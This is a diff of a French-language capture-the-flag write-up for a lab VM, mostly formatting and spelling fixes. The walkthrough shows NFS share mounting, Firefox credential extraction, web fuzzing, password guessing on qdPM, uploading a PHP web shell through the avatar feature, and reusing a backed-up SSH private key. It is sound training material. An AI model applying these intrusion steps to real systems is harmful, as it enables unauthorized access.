@@ -10,7 +10,7 @@ High Jack
 
 On a aussi ce conseil si jamais on est bloqué : *A cewl tool can help you get past a login page*.  
 
-```
+```console
 $ sudo nmap -T5 -p- -sCV 192.168.56.3 
 Starting Nmap 7.92 ( https://nmap.org )
 Nmap scan report for 192.168.56.3 
@@ -66,7 +66,7 @@ On a beaucoup de ports liés aux services RPC. Evidemment seul NFS semble intér
 
 Il est temps de jeter un œil plus curieux sur les partages NFS :  
 
-```
+```console
 $ showmount -e 192.168.56.3 
 Export list for 192.168.56.3: 
 /home/ch33s3m4n *
@@ -75,7 +75,7 @@ Export list for 192.168.56.3:
 On a donc cet utilisateur qui dispose de son dossier personnel en partage. On peut le monter simplement :  
 
 ```bash
-$ sudo mount 192.168.56.3:/home/ch33s3m4n /mnt/
+sudo mount 192.168.56.3:/home/ch33s3m4n /mnt/
 ```
 
 On est bien sûr tenté d'en profiter en rajoutant notre clé publique SSH dans les clés autorisées pour l'utilisateur :  
@@ -85,11 +85,11 @@ cp ~/.ssh/id_rsa.pub /mnt/.ssh/authorized_keys
 cp: impossible de créer le fichier standard '/mnt/.ssh/authorized_keys': Système de fichiers accessible en lecture seulement
 ```
 
-Raté... En fouillant dans les fichiers on ne remarque rien de vraiment critique. Dans le dossier *Downloads* se trouve une archive *qdPM\_9.1.zip* qui est [une webapp de gestion de projet](https://qdpm.net/).  
+Raté... En fouillant dans les fichiers, on ne remarque rien de vraiment critique. Dans le dossier *Downloads* se trouve une archive `qdPM_9.1.zip` qui est [une webapp de gestion de projet](https://qdpm.net/).  
 
-Étrangement il y a un dossier *.mozilla* avec les données de navigation de Firefox. Je les copie donc et tente d'extraire les potentiels mots de passes enregistrés avec [firefox\_decrypt](https://github.com/devl00p/firefox_decrypt) (j'ai forké le projet car le mainteneur ne souhaite pas maintenir une compatibilité avec les versions moins récentes de Python 3).  
+Étrangement, il y a un dossier `.mozilla` avec les données de navigation de Firefox. Je les copie donc et tente d'extraire les potentiels mots de passes enregistrés avec [firefox\_decrypt](https://github.com/devl00p/firefox_decrypt) (j'ai forké le projet car le mainteneur ne souhaite pas maintenir une compatibilité avec les versions moins récentes de Python 3).  
 
-```
+```console
 $ python3 firefox_decrypt.py /tmp/mozilla_dir/firefox/ 
 Select the Mozilla profile you wish to decrypt 
 1 -> q525c4g9.default 
@@ -100,7 +100,7 @@ ERROR - Couldn't find credentials file (logins.json or signons.sqlite).
 
 Rien d'intéressant n'a été enregistré. On peut fouiller dans l'historique des pages navigués manuellement :  
 
-```
+```console
 $ sqlite3 places.sqlite 
 SQLite version 3.36.0 2021-06-18 18:36:39 
 Enter ".help" for usage hints. 
@@ -123,17 +123,17 @@ roject Management Tool for free.  qdPM is a free web-based project management t
 126|7
 ```
 
-Finalement on est pas plus avancés...  
+Finalement on n'est pas plus avancés...  
 
 Car Jack
 --------
 
-La page d'index du site ne donnant rien de probant, je trouve via Feroxbuster le dossier */forms/* avec deux scripts PHP, chacun donne une erreur *Unable to load the "PHP Email Form" Library!*. Cassés donc.  
+La page d'index du site ne donnant rien de probant, je trouve via Feroxbuster le dossier `/forms/` avec deux scripts PHP, chacun donne une erreur *Unable to load the "PHP Email Form" Library!*. Cassés donc.  
 
 Comme un nom d'hôte apparaissant dans le code HTML (*cheeseyjack.local*) j'ai tenté d'énumérer les hôtes virtuels, là encore sans succès :  
 
 ```bash
-$ ffuf -w /fuzzdb/discovery/dns/alexaTop1mAXFRcommonSubdomains.txt -u http://192.168.56.3/ -H "Host: FUZZ.cheeseyjack.local"  -fs 7247
+$ ffuf -w /fuzzdb/discovery/dns/alexaTop1mAXFRcommonSubdomains.txt -u http://192.168.56.3/ -H "Host: FUZZ.cheeseyjack.local" -fs 7247
 ```
 
 Finalement en utilisant la wordlist *directory-list-2.3-big.txt* (que vous trouverez facilement sur Github) je trouve déjà ce fichier */it\_security/note.txt* :  
@@ -146,20 +146,20 @@ Finalement en utilisant la wordlist *directory-list-2.3-big.txt* (que vous trouv
 > 
 >  -crab
 
-Ainsi qu'un dossier */project\_management* qui semble être une installation de *qdPM* mentionné plus tôt.  
+Ainsi qu'un dossier `/project_management` qui semble être une installation de *qdPM* mentionné plus tôt.  
 
-Avec la note précédente on va donc tenter de trouver un compte valide pour le webapp. J'ai été un peu trompé par l'indice indiquant d'utiliser [Cewl](https://github.com/digininja/cewl) qui ne m'a mené à rien.  
+Avec la note précédente, on va donc tenter de trouver un compte valide pour le webapp. J'ai été un peu trompé par l'indice indiquant d'utiliser [Cewl](https://github.com/digininja/cewl) qui ne m'a mené à rien.  
 
-L'appli demande un email pour nom d'utilisateur donc certainement *cheese@cheeseyjack.local* ou *ch33s3m4n@cheeseyjack.local* (rapport au nom d'utilisateur Unix).  
+L'appli demande un email pour nom d'utilisateur donc certainement `cheese@cheeseyjack.local` ou `ch33s3m4n@cheeseyjack.local` (rapport au nom d'utilisateur Unix).  
 
-Avec le dernier et le mot de passe *qdpm* je parvient finalement à me connecter sur l'application.  
+Avec le dernier et le mot de passe *qdpm* je parviens finalement à me connecter sur l'application.  
 
 Lumber Jack
 -----------
 
 Sur [exploit-db](https://www.exploit-db.com/exploits/48460) on trouve la description d'une vulnérabilité pour *qdPM 9.1*. Il n'y a pas de code d'exploitation et pour cause, il suffit d'uploader un script PHP une fois authentifié en abusant la fonctionnalité de sélection d'un avatar qui ne vérifie pas les extensions de fichier.  
 
-Une fois mon shell PHP uploadé un petit click droit me permet de retrouver son emplacement : */project\_management/uploads/users/179373-shell.php*  
+Une fois mon shell PHP uploadé un petit click droit me permet de retrouver son emplacement : `/project_management/uploads/users/179373-shell.php`  
 
 Je remarque deux utilisateurs non privilégiés sur le système :  
 
@@ -170,7 +170,7 @@ crab:x:1001:1001::/home/crab:/bin/bash
 
 Le dernier dispose d'une TODO list intéressante :  
 
-```
+```console
 www-data@cheeseyjack:/var/www/html/project_management/uploads/users$ cat /home/crab/todo.txt  
 1. Scold cheese for weak qdpm password (done) 
 2. Backup SSH keys to /var/backups 
@@ -180,11 +180,11 @@ www-data@cheeseyjack:/var/www/html/project_management/uploads/users$ cat /home/c
 6. Stop putting my grocery list on my todo lists
 ```
 
-Il y a en effet un fichier *key.bak* dans */var/backups*  qui correspond à la clé privée de cet utilisateur. Abusons en !  
+Il y a en effet un fichier `key.bak` dans `/var/backups` qui correspond à la clé privée de cet utilisateur. Abusons-en !  
 
 Une fois connecté on remarque que l'utilisateur a des droits sudo pour un dossier sur lequel on a le contrôle :  
 
-```
+```console
 crab@cheeseyjack:~$ sudo -l 
 Matching Defaults entries for crab on cheeseyjack: 
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 
